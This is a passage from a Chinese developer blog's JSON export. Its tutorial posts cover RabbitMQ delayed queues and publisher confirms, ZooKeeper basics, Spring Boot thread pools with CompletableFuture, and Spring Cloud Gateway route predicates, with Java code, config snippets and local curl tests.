Lorg/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest; 16 11 1 date Ljava/util/Date; 19 8 2 count I","categories":[],"tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"JVM","slug":"JVM","permalink":"http://yoursite.com/tags/JVM/"}]},{"title":"RabbitMQ-延迟队列","slug":"RabbitMQ-延迟队列","date":"2020-05-13T10:43:36.000Z","updated":"2020-11-14T17:10:39.183Z","comments":true,"path":"2020/05/13/RabbitMQ-延迟队列/","link":"","permalink":"http://yoursite.com/2020/05/13/RabbitMQ-%E5%BB%B6%E8%BF%9F%E9%98%9F%E5%88%97/","excerpt":"","text":"RabbitMQ延迟队列介绍[ 官网上的介绍 ](https://www.rabbitmq.com/blog/2015/04/16/scheduling-messages-with-rabbitmq/) 实现方式： 混合使用message TTL 和 Dead Letter Exchanges 使用 RabbitMQ Delayed Message Plugin 来实现 混合使用Message TTL和Dead Letter Exchanges 利用dead letter exchange的规则 The message is negatively acknowledged by a consumer using basic.reject or basic.nack with requeue parameter set to false.消费者拒绝或者nack The message expires due to per-message TTL ; or 消息ttl The message is dropped because its queue exceeded a length limit 消息被丢弃由于队列超过长度限制 生产者发送消息给延迟交换机时，让消息设置特定时间过期，转发到延迟队列。这个延迟队列创建时，声明dead letter exchange name和deadletter routingkey。由于没有设置消费者，去监听这个延迟队列，导致这个消息ttl，最终转发到死信exchange，根据死信routingkey转发死信队列。（这边的例子，我会在下面举例） 消费者 # application.yml server: port: 8080 spring: rabbitmq: username: username password: password host: localhost port: 5672 virtual-host: /test @Configuration public class RabbitConfig { private static final String DELAY_QUEUE_NAME = &quot;test_delay_ttl_springboot_queue&quot;; private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_ttl_springboot_exchange&quot;; private static final String DELAY_ROUTING_KEY = &quot;test_delay_ttl_springboot_routingkey&quot;; private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;; private static final String DEAD_EXCHANGE_NAME = &quot;test_dead_ttl_springboot_exchange&quot;; private static final String DEAD_ROUTING_KEY = &quot;test_dead_ttl_springboot_routingkey&quot;; // 延迟队列 @Bean public Queue dealyQueue(){ Map&lt;String,Object&gt; args = new HashMap&lt;&gt;(); // x-dead-letter-exchange 当前队列声明的死信路由 args.put(&quot;x-dead-letter-exchange&quot;, DEAD_EXCHANGE_NAME); // x-dead-letter-routing-key 这里声明当前队列的死信路由key args.put(&quot;x-dead-letter-routing-key&quot;, DEAD_ROUTING_KEY); return QueueBuilder.durable(DELAY_QUEUE_NAME).withArguments(args).build(); } // 死信queue @Bean public Queue deadQueue(){ return new Queue(DEAD_QUEUE_NAME); } // 延迟exchange @Bean public DirectExchange delayExchange(){ return new DirectExchange(DELAY_EXCHANGE_NAME); } // 死信exchange @Bean public DirectExchange deadExchange(){ return new DirectExchange(DEAD_EXCHANGE_NAME); } @Bean public Binding dealyBinding(@Qualifier(&quot;dealyQueue&quot;)Queue queue,@Qualifier(&quot;delayExchange&quot;)Exchange exchange){ return BindingBuilder.bind(queue).to(exchange).with(DELAY_ROUTING_KEY).noargs(); } @Bean public Binding deadBinding(@Qualifier(&quot;deadQueue&quot;)Queue queue,@Qualifier(&quot;deadExchange&quot;)Exchange exchange){ return BindingBuilder.bind(queue).to(exchange).with(DEAD_ROUTING_KEY).noargs(); } } private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_ttl_springboot_exchange&quot;; private static final String DELAY_ROUTING_KEY = &quot;test_delay_ttl_springboot_routingkey&quot;; @Resource private RabbitTemplate rabbitTemplate; @Override public void sendDelayMsgTTL(String msg, Integer delay) { rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_ROUTING_KEY,msg,msgProcessor-&gt;{ msgProcessor.getMessageProperties().setExpiration(delay.toString()); return msgProcessor; }); } // 发送短信 mqService.sendDelayMsgTTL(&quot;hello,i send a delay msg by ttl&quot;,5000);消费者 消费者配置文件和生成者一样 private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;; @RabbitListener(queues = DEAD_QUEUE_NAME) public void delay(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); }运行上面消费者，可以看到5秒后消费者收到 那么，我们来监听延迟队列 private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;; @RabbitListener(queues = &quot;test_delay_ttl_springboot_queue&quot;) public void delay(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); } @RabbitListener(queues = DEAD_QUEUE_NAME) public void delay2(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); }可以看到，生产者发送消息，消费者瞬间收到。并且死信队列不会监听到消息。 使用RabbitMQ Delayed Message Plugin来实现延迟队列安装步骤 前往https://www.rabbitmq.com/community-plugins.html，下载 rabbitmq_delayed_message_exchange 插件 将下载好的插件放入rabbitmq安装目录中的plugin 文件夹下 执行命令 rabbitmq-plugins enable rabbitmq_delayed_message_exchange 让该plugin可以使用 插件安装完毕后，就会有一个x-delayed-message类型的exchange代码 // 声明队列和queue private static final String DELAY_QUEUE_NAME = &quot;test_delay_queue_springboot&quot;; private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_exchange_springboot&quot;; private static final String DELAY_EXCHANGE_ROUTING_KEY = &quot;test_delay_routingkey_springboot&quot;; @Bean public Queue delayQueue(){ return new Queue(DELAY_QUEUE_NAME); } @Bean public CustomExchange customExchange(){ Map&lt;String,Object&gt; args = new HashMap&lt;&gt;(); args.put(&quot;x-delayed-type&quot;,&quot;direct&quot;); return new CustomExchange(DELAY_EXCHANGE_NAME,&quot;x-delayed-message&quot;,true,false,args); } @Bean public Binding binding(@Qualifier(&quot;delayQueue&quot;)Queue queue,@Qualifier(&quot;customExchange&quot;)CustomExchange customExchange){ return BindingBuilder.bind(queue).to(customExchange).with(DELAY_EXCHANGE_ROUTING_KEY).noargs(); } // 设置具体的延迟时间 @Override public void sendDelayMsg(String message, Integer delay) { rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_EXCHANGE_ROUTING_KEY,message,msgProcessor-&gt;{ msgProcessor.getMessageProperties().setDelay(delay); return msgProcessor; }); } // 接收消息 @RabbitListener(queues = DELAY_QUEUE_NAME) public void delay(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); // 可以看到具体延迟了多少时间，其实也就是x-delay这个头 System.out.println(message.getMessageProperties().getReceivedDelay()); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); }可以看到使用插件也可以实现这个功能。 下面，我们来测试一下死信相关的功能我们发生一条信息到延迟队列里面，监听这个队列，消费的时候拒绝这个消息，这样这条消息就会发往死信队列 // 生产者 @Override public void sendMsgUAck(String message) { rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_ROUTING_KEY,message); } // 消费者 //监听死信队列 @RabbitListener(queues = DEAD_QUEUE_NAME) public void delay2(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); } // 监听延迟队列 @RabbitListener(queues = &quot;test_delay_ttl_springboot_queue&quot;) public void delay3(Message message, Channel channel) throws IOException { channel.basicNack(message.getMessageProperties().getDeliveryTag(),false,false); System.out.println(&quot;uack message&quot;); }可以看到发生消息，延迟队列消费者拒绝，立刻发往死信队列。（扣库存相关逻辑，可以参考） 参考[ 官方文档 ](https://www.rabbitmq.com/blog/2015/04/16/scheduling-messages-with-rabbitmq/) 弗兰克的猫的博文","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-Publisher Confirms","slug":"RabbitMQ-Publisher Confirms","date":"2020-05-07T09:57:50.000Z","updated":"2020-11-14T17:10:39.683Z","comments":true,"path":"2020/05/07/RabbitMQ-Publisher Confirms/","link":"","permalink":"http://yoursite.com/2020/05/07/RabbitMQ-Publisher%20Confirms/","excerpt":"","text":"Publisher Confirms[ Publisher confirms ](https://www.rabbitmq.com/confirms.html#publisher-confirms) are a RabbitMQ extension to implement reliable publishing. Whenpublisher confirms are enabled on a channel, messages the client publishes areconfirmed asynchronously by the broker, meaning they have been taken care ofon the server side. publisher confirms是一个RabbitMQ的插件用于实现可靠的发布。当publisherconfirms在channel上启用时，broker将异步确认客户端发送的信息，意味着服务端接收到了消息。 在channel上启用publisherconfirmChannel channel = connection.createChannel(); channel.confirmSelect();publishing Message individually 单独发送消息private final static String QUEUE_NAME = &quot;test_queue_confirm1&quot;; public static void main(String[] args) throws IOException, TimeoutException, InterruptedException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); // 生产者调用confirmSelect将channel设置为confirm模式注意 channel.confirmSelect(); String message = &quot;hello confirm message&quot;; channel.basicPublish(&quot;&quot;,QUEUE_NAME,null,message.getBytes()); if(!channel.waitForConfirms()){ System.out.println(&quot;message send failed&quot;); }else{ System.out.println(&quot;message send ok&quot;); } channel.close(); connection.close(); }publishing messages in batches 批量发送消息private final static String QUEUE_NAME = &quot;test_queue_confirm2&quot;; public static void main(String[] args) throws IOException, TimeoutException, InterruptedException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); // 生产者调用confirmSelect将channel设置为confirm模式注意 // 批量 channel.confirmSelect(); for (int i = 0;i&lt;10;i++) { String message = &quot;hello confirm message &quot; + i; channel.basicPublish(&quot;&quot;, QUEUE_NAME, null, message.getBytes()); } if(!channel.waitForConfirms()){ System.out.println(&quot;message send failed&quot;); }else{ System.out.println(&quot;message send ok&quot;); } channel.close(); connection.close(); }handling publisher confirms asynchronously 异步地处理消息确认private final static String QUEUE_NAME = &quot;test_queue_confirm4&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); channel.confirmSelect(); channel.addConfirmListener(new ConfirmListener() { @Override public void handleAck(long deliveryTag, boolean multiple) throws IOException { System.out.println(&quot;handleAck deliveryTag &quot;+deliveryTag+&quot; multiple&quot;+multiple); } @Override public void handleNack(long deliveryTag, boolean multiple) throws IOException { System.out.println(&quot;handleNack deliveryTag &quot;+deliveryTag+&quot; multiple&quot;+multiple); } }); long nextSeqNo = channel.getNextPublishSeqNo(); channel.basicPublish(&quot;&quot;,QUEUE_NAME,null,&quot;send listener message&quot;.getBytes()); System.out.println(&quot;[send] message&quot; +&quot;send listener message&quot; + &quot;nextSeqNo &quot;+ nextSeqNo ); }总结rabbitMq的ack和publisher confirm需要区分开来。","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"zookeeper-简介","slug":"zookeeper-简介","date":"2020-04-24T10:15:35.000Z","updated":"2020-11-14T17:10:40.154Z","comments":true,"path":"2020/04/24/zookeeper-简介/","link":"","permalink":"http://yoursite.com/2020/04/24/zookeeper-%E7%AE%80%E4%BB%8B/","excerpt":"","text":"简介ZooKeeper: A Distributed Coordination Service for Distributed Applications zooKeeper:一个分布式应用的分布式协调服务 ZooKeeper is a distributed, open-source coordination service for distributed applications. It exposes a simple set of primitives that distributed applications can build upon to implement higher level services for synchronization, configuration maintenance, and groups and naming. It is designed to be easy to program to, and uses a data model styled after the familiar directory tree structure of file systems. It runs in Java and has bindings for both Java and C. zooKeeper是一个分布式应用的分布式，开源，协调服务。它提供了一组简单的原语，分布式应用可以在这些原语基础上实现更高级的服务，用于同步，配置维护，组合命名。它被设计易于使用，并使用了风格和文件系统相似的数据模型。它在java运行，并具有java和c绑定。 Coordination services are notoriously hard to get right. They are especially prone to errors such as race conditions and deadlock. The motivation behind ZooKeeper is to relieve distributed applications the responsibility of implementing coordination services from scratch. 协调服务是出了名的难写。他们特别容易出现竞争条件和死锁错误。zookeeper背后的动机是为了减少分布式应用程序从头实现协调服务的责任。 Design Goals ZooKeeper is simple. ZooKeeper allows distributed processes to coordinate with each other through a shared hierarchical namespace which is organized similarly to a standard file system. The namespace consists of data registers - called znodes, in ZooKeeper parlance - and these are similar to files and directories. Unlike a typical file system, which is designed for storage, ZooKeeper data is kept in-memory, which means ZooKeeper can achieve high throughput and low latency numbers. zooKeeper是简单的。zooKeeper允许分布式进程通过共享的层次命名空间相互协调，该命名空间类似于标准文件系统。命名空间由数据寄存器注册，用zooKeeper的话说叫znodes，类似于文件系统中的目录和文件。不像典型的文件系统，zookeeper是设计用于保存在内存中，意味着zooKeeper可以实现高吞吐量和低延迟率。 The ZooKeeper implementation puts a premium on high performance, highly available, strictly ordered access. The performance aspects of ZooKeeper means it can be used in large, distributed systems. The reliability aspects keep it from being a single point of failure. The strict ordering means that sophisticated synchronization primitives can be implemented at the client. ZooKeeper实施对高性能，高可用性，严格有序访问加以重视。 ZooKeeper的性能方面意味着它可以在大型的分布式系统中使用。 可靠性方面使它不会成为单点故障。 严格排序意味着可以在客户端上实现复杂的同步原语。 ZooKeeper is replicated. Like the distributed processes it coordinates, ZooKeeper itself is intended to be replicated over a set of hosts called an ensemble. ZooKeeper是复制的。与它所协调的分布式进程一样，ZooKeeper本身也打算在一组称为集合的主机上进行复制。 The servers that make up the ZooKeeper service must all know about each other. They maintain an in-memory image of state, along with a transaction logs and snapshots in a persistent store. As long as a majority of the servers are available, the ZooKeeper service will be available. 组成ZooKeeper服务的服务器必须相互了解。它们在内存中维护状态映像，以及持久存储中的事务日志和快照。只要大多数服务器可用，ZooKeeper服务就可用。 Clients connect to a single ZooKeeper server. The client maintains a TCP connection through which it sends requests, gets responses, gets watch events, and sends heart beats. If the TCP connection to the server breaks, the client will connect to a different server. 客户端连接到单个ZooKeeper服务器。客户端维护一个TCP连接，通过它发送请求、获取响应、获取监视事件和发送心跳。如果到服务器的TCP连接中断，客户机将连接到另一台服务器。 ZooKeeper is ordered. ZooKeeper stamps each update with a number that reflects the order of all ZooKeeper transactions. Subsequent operations can use the order to implement higher-level abstractions, such as synchronization primitives. Zookeeper是有序的。ZooKeeper用一个数字来标记每个更新，这个数字反映了所有ZooKeeper事务的顺序。后续操作可以使用该顺序实现更高级别的抽象，比如同步原语。 ZooKeeper is fast. It is especially fast in &quot;read-dominant&quot; workloads. ZooKeeper applications run on thousands of machines, and it performs best where reads are more common than writes, at ratios of around 10:1. ZooKeeper很快。在“以读取为主”的工作负载中，它的速度特别快。ZooKeeper应用程序运行在数千台机器上，当读操作比写操作更常见时，它的性能最好，比率约为10:1。 Data model and the hierarchical namespace The namespace provided by ZooKeeper is much like that of a standard file system. A name is a sequence of path elements separated by a slash (/). Every node in ZooKeeper&apos;s namespace is identified by a path. 数据模型和分层名称空间 ZooKeeper提供的名称空间与标准文件系统的名称空间非常相似。 名称是由斜杠（/）分隔的一系列路径元素。 ZooKeeper命名空间中的每个节点都由路径标识。 Nodes and ephemeral nodes Unlike standard file systems, each node in a ZooKeeper namespace can have data associated with it as well as children. It is like having a file-system that allows a file to also be a directory. (ZooKeeper was designed to store coordination data: status information, configuration, location information, etc., so the data stored at each node is usually small, in the byte to kilobyte range.) We use the term znode to make it clear that we are talking about ZooKeeper data nodes. Znodes maintain a stat structure that includes version numbers for data changes, ACL changes, and timestamps, to allow cache validations and coordinated updates. Each time a znode&apos;s data changes, the version number increases. For instance, whenever a client retrieves data it also receives the version of the data. The data stored at each znode in a namespace is read and written atomically. Reads get all the data bytes associated with a znode and a write replaces all the data. Each node has an Access Control List (ACL) that restricts who can do what. ZooKeeper also has the notion of ephemeral nodes. These znodes exists as long as the session that created the znode is active. When the session ends the znode is deleted. 节点和短暂节点 与标准文件系统不同，ZooKeeper命名空间中的每个节点都可以具有与其关联的数据以及子节点。 就像拥有一个文件系统一样，该文件系统也允许文件成为目录。 （ZooKeeper旨在存储协调数据：状态信息，配置，位置信息等，因此存储在每个节点上的数据通常很小，在字节到千字节范围内。）我们使用术语znode来明确表示 在谈论ZooKeeper数据节点。 Znodes维护一个统计信息结构，其中包括用于数据更改，ACL更改和时间戳的版本号，以允许进行缓存验证和协调更新。 znode的数据每次更改时，版本号都会增加。 例如，每当客户端检索数据时，它也接收数据的版本。 原子地读取和写入存储在名称空间中每个znode上的数据。 读取将获取与znode关联的所有数据字节，而写入将替换所有数据。 每个节点都有一个访问控制列表（ACL），用于限制谁可以执行操作。 ZooKeeper还具有短暂节点的概念。 只要创建znode的会话处于活动状态，这些znode就存在。 会话结束时，将删除znode。 Conditional updates and watches ZooKeeper supports the concept of watches. Clients can set a watch on a znode. A watch will be triggered and removed when the znode changes. When a watch is triggered, the client receives a packet saying that the znode has changed. If the connection between the client and one of the ZooKeeper servers is broken, the client will receive a local notification. 条件更新和手表ZooKeeper支持手表的概念。客户端可以在znode上设置手表。当znode发生变化时，将触发并删除一个手表。当一个手表被触发时，客户端会收到一个数据包，说znode已经改变了。如果客户端和一个ZooKeeper服务器之间的连接断开，客户端将收到一个本地通知。安装zookeeperStandalone Operation 1.下载zookeeper，通过fileZile上传上去 tar -zxvf apache-zookeeper-3.6.0-bin.tar.gz 2.安装java 3.将解压后的文件名重命名 mv apache-zookeeper-3.6.0-bin zookeeper 并移动至/usr/lib mv /tmp/zookeeper/ /usr/lib Standalone Operation 单击演示 4.生成一个zoo.cfg vi conf zoo.cfg ​``` tickTime=2000 dataDir=/var/lib/zookeeper clientPort=2181 ​``` 启动 sh bin/zkServer.sh start 5.测试 sh bin/zkCli.sh -server 127.0.0.1:2181 ls / [ zookeeper] Next, create a new znode by running create /zk_test my_data. This creates a new znode and associates the string &quot;my_data&quot; with the node. You should see: [zkshell: 9] create /zk_test my_data Created /zk_test [zk: 127.0.0.1:2181(CONNECTED) 0] ls / [zk_test, zookeeper] [zk: 127.0.0.1:2181(CONNECTED) 3] get /zk_test my_data [zk: 127.0.0.1:2181(CONNECTED) 5] get -s /zk_test my_data cZxid = 0x3 ctime = Wed Apr 22 18:33:23 CST 2020 mZxid = 0x3 mtime = Wed Apr 22 18:33:23 CST 2020 pZxid = 0x3 cversion = 0 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 7 numChildren = 0 [zk: 127.0.0.1:2181(CONNECTED) 6] set /zk_test junk [zk: 127.0.0.1:2181(CONNECTED) 7] get -s /zk_test junk cZxid = 0x3 ctime = Wed Apr 22 18:33:23 CST 2020 mZxid = 0x7 mtime = Fri Apr 24 17:48:13 CST 2020 pZxid = 0x3 cversion = 0 dataVersion = 1 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 4 numChildren = 0 可以看到mTime被改变了，以及znode的值 [zk: 127.0.0.1:2181(CONNECTED) 8] delete /zk_test 删除/zk_test [zk: 127.0.0.1:2181(CONNECTED) 9] get -s /zk_test org.apache.zookeeper.KeeperException$NoNodeException: KeeperErrorCode = NoNode for /zk_test集群模式 后续再介绍","categories":[],"tags":[{"name":"ZooKeeper","slug":"ZooKeeper","permalink":"http://yoursite.com/tags/ZooKeeper/"},{"name":"zookeeper","slug":"zookeeper","permalink":"http://yoursite.com/tags/zookeeper/"}]},{"title":"springboot线程池","slug":"springboot线程池","date":"2020-04-20T09:12:01.000Z","updated":"2020-11-14T17:10:40.693Z","comments":true,"path":"2020/04/20/springboot线程池/","link":"","permalink":"http://yoursite.com/2020/04/20/springboot%E7%BA%BF%E7%A8%8B%E6%B1%A0/","excerpt":"","text":"配置一个ExecutorService@Configuration @EnableAsync public class BeanConfig { @Bean public ExecutorService getAsyncExecutor(){ ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); executor.setCorePoolSize(7); executor.setMaxPoolSize(42); executor.setQueueCapacity(11); executor.setThreadNamePrefix(&quot;async-executor-&quot;); executor.initialize(); return executor.getThreadPoolExecutor(); } }编写package com.huskyui.currencyspringinaction.controller; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import javax.annotation.Resource; import java.util.concurrent.*; /** * @author huskyui * @date 2020/4/17 15:50 */ @RestController public class HelloController { private Logger logger = LoggerFactory.getLogger(HelloController.class); @Resource private ExecutorService executorService; @RequestMapping(&quot;/sync&quot;) public String sync() { long start = System.currentTimeMillis(); int resultA = 0, resultB = 0; try { TimeUnit.SECONDS.sleep(2); resultA = 2; } catch (InterruptedException e) { e.printStackTrace(); } try { TimeUnit.SECONDS.sleep(1); resultB = 1; } catch (InterruptedException e) { e.printStackTrace(); } long cost = System.currentTimeMillis() - start; logger.info(&quot;sync cost:{} result {}&quot;, cost, (resultA + resultB)); return String.valueOf(resultA + resultB); } @RequestMapping(&quot;/async&quot;) public String async() throws ExecutionException, InterruptedException { long start = System.currentTimeMillis(); int result = 0; // Integer是futureA的返参类型 CompletableFuture&lt;Integer&gt; futureA = CompletableFuture.supplyAsync(() -&gt; { // 模拟工作1 try { TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } return 2; }, executorService); CompletableFuture&lt;Integer&gt; futureB = CompletableFuture.supplyAsync(() -&gt; { // 模拟工作2 try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } return 1; }, executorService); CompletableFuture&lt;Void&gt; allFuture = CompletableFuture.allOf(futureA, futureB); allFuture.join(); result = futureA.get() + futureB.get(); long cost = System.currentTimeMillis() - start; logger.info(&quot;async cost:{} result {}&quot;, cost, result); return String.valueOf(result); } }测试可以看到sync请求时，会耗时3秒，async请求，耗时2秒 感谢阅读了一些其他人的博客，以及Netty交流群里面大佬传授 第二种写法可以查看 官方教程 使用 @Async 注解 @Service public class GitHubLookupService { private static final Logger logger = LoggerFactory.getLogger(GitHubLookupService.class); private final RestTemplate restTemplate; public GitHubLookupService(RestTemplateBuilder restTemplateBuilder) { this.restTemplate = restTemplateBuilder.build(); } @Async public CompletableFuture&lt;User&gt; findUser(String user) throws InterruptedException{ logger.info(&quot;Looking up &quot;+user); String url = String.format(&quot;https://api.github.com/users/%s&quot;,user); User results = restTemplate.getForObject(url,User.class); // Artificial delay of 1s for demonstration purpose Thread.sleep(1000L); return CompletableFuture.completedFuture(results); } } @Component public class AppRunner implements CommandLineRunner { private static final Logger logger = LoggerFactory.getLogger(AppRunner.class); private final GitHubLookupService gitHubLookupService; public AppRunner(GitHubLookupService githubLookupService) { this.gitHubLookupService = githubLookupService; } @Override public void run(String... args) throws Exception { // start the Clock long start = System.currentTimeMillis(); // Kick of multiple,asynchronous lookups CompletableFuture&lt;User&gt; page1 = gitHubLookupService.findUser(&quot;PivotalSoftware&quot;); CompletableFuture&lt;User&gt; page2 = gitHubLookupService.findUser(&quot;CloudFoundry&quot;); CompletableFuture&lt;User&gt; page3 = gitHubLookupService.findUser(&quot;Spring-Projects&quot;); CompletableFuture&lt;User&gt; page4 = gitHubLookupService.findUser(&quot;huskyui&quot;); // wait unit they are all done CompletableFuture.allOf(page1, page2, page3, page4).join(); logger.info(&quot;Elapsed time: &quot; + (System.currentTimeMillis() - start)); logger.info(&quot;--&gt;&quot; + page1.get()); logger.info(&quot;--&gt;&quot; + page2.get()); logger.info(&quot;--&gt;&quot; + page3.get()); logger.info(&quot;--&gt;&quot; + page4.get()); } }当然对于，任务的数量不定的话，可以使用下面这张方式 @Override public List&lt;String&gt; doTasks() throws InterruptedException, ExecutionException { List&lt;String&gt; result = new ArrayList&lt;&gt;(); List&lt;CompletableFuture&lt;String&gt;&gt; completableFutureList = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 100; i++) { completableFutureList.add(taskService.doSingleTask(i)); } CompletableFuture&lt;String&gt;[] completableFutures = completableFutureList.toArray(new CompletableFuture[completableFutureList.size()]); CompletableFuture.allOf(completableFutures).join(); for(CompletableFuture&lt;String&gt; future:completableFutures){ result.add(future.get()); } return result; }","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"springboot","slug":"springboot","permalink":"http://yoursite.com/tags/springboot/"}]},{"title":"spring cloud gateway","slug":"spring cloud gateway","date":"2020-04-17T02:42:54.000Z","updated":"2020-11-14T17:10:41.445Z","comments":true,"path":"2020/04/17/spring cloud gateway/","link":"","permalink":"http://yoursite.com/2020/04/17/spring%20cloud%20gateway/","excerpt":"","text":"在写之前，想写一下感受，之前有对接过springcloud的项目，有以下几个感受 1.我们请求所有接口，都是请求同一个端口，路径不同，都会加一个token来验证权限 我感觉是这么实现的，服务器对外访问只开放gateway项目端口，然后加一个token来全局filter 当然，我不是这个项目的设计师，这是凭空想象而已。 简介This project provides an API Gateway built on top of the Spring Ecosystem,including: Spring 5, Spring Boot 2 and Project Reactor. Spring Cloud Gatewayaims to provide a simple, yet effective way to route to APIs and provide crosscutting concerns to them such as: security, monitoring/metrics, andresiliency. 该项目提供了一个在spring生态系统上构建的api网关，包括spring 5,spring boot2和project reactor.springcloud gateway旨在提供一个简单有效的路由到apis并且提供跨领域的关注点如：安全，检测、指标和弹性。 术语 Route : The basic building block of the gateway. It is defined by an ID, a destination URI, a collection of predicates, and a collection of filters. A route is matched if the aggregate predicate is true.—-Route是gateway中最基本块，如果所有predicate是true，那么route会被匹配 Predicate : This is a Java 8 Function Predicate . The input type is a Spring Framework ServerWebExchange . This lets you match on anything from the HTTP request, such as headers or parameters.通过java8提供的Predicate，我们可以匹配HttpRequest中的，headers或者parameters Filter : These are instances of Spring Framework GatewayFilter that have been constructed with a specific factory. Here, you can modify requests and responses before or after sending the downstream request.我们可以在发送给下游之前修改请求或者之后修改返回回来的响应。这里，我们用下面一张图来解释 ​ 从图中，我们需要注意到Filter中是支持请求前，和响应后的处理的 装配spring cloud gatewaypom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--暂时先注释 &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; --&gt; &lt;!--spring cloud version :Hoxton.SR3--&gt;application.yml management: endpoints: web: exposure: include: &quot;*&quot; server: port: 10000 #spring: 此处注释改为java注入 # cloud: # gateway: # routes: # - id: first # uri: http://localhost:9000 # predicates: # - Path=/** logging: level: org.springframework.cloud.gateway: debugjava注入 @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){ return builder.routes() .route(r-&gt;r.path(&quot;/**&quot;) .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;) ).build(); }测试 D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui hello, huskyui Mon Apr 13 17:25:28 CST 2020介绍predicatejava8中的predicate,就是filter里面的函数。这是一个比较直观的例子 List&lt;Integer&gt; list = new ArrayList&lt;&gt;(Arrays.asList(1,2,3,4,5,6,7,8,9)); list.stream().filter(t-&gt;t&lt;5).forEach(System.out::println); 输出 1,2,3,4PathRoutePredicateFactory@Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){ return builder.routes() .route(r-&gt;r.path(&quot;/**&quot;) .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;) ).build(); } 放开了/**,也就是放开了所有http://localhost:9000所有路径 D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui hello, huskyui Mon Apr 13 17:25:28 CST 2020CookieRoutePredicateFactory @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){ return builder.routes() .route(r-&gt;r .cookie(&quot;token&quot;,&quot;kee.e&quot;) .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;) ).build(); } D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui {&quot;timestamp&quot;:&quot;2020-04-13T10:03:43.548+0000&quot;,&quot;path&quot;:&quot;/hello/huskyui&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:null,&quot;requestId&quot;:&quot;b330030a-1&quot;} D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui --cookie &quot;token=keexe&quot; hello, huskyui Mon Apr 13 18:03:55 CST 2020 D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui --cookie &quot;token=keeeee&quot; {&quot;timestamp&quot;:&quot;2020-04-13T10:09:09.207+0000&quot;,&quot;path&quot;:&quot;/hello/huskyui&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:null,&quot;requestId&quot;:&quot;23aba850-3&quot;}组合使用 @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){ return builder.routes() .route(r-&gt;r .method(HttpMethod.POST) .and() .path(&quot;/**&quot;) .and() .cookie(&quot;token&quot;,&quot;kee.e&quot;) .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;) ).build(); } D:\\gitclonepackage\\cloud&gt;curl -X POST http://localhost:10000/hello/huskyui --cookie &quot;token=keeie&quot; 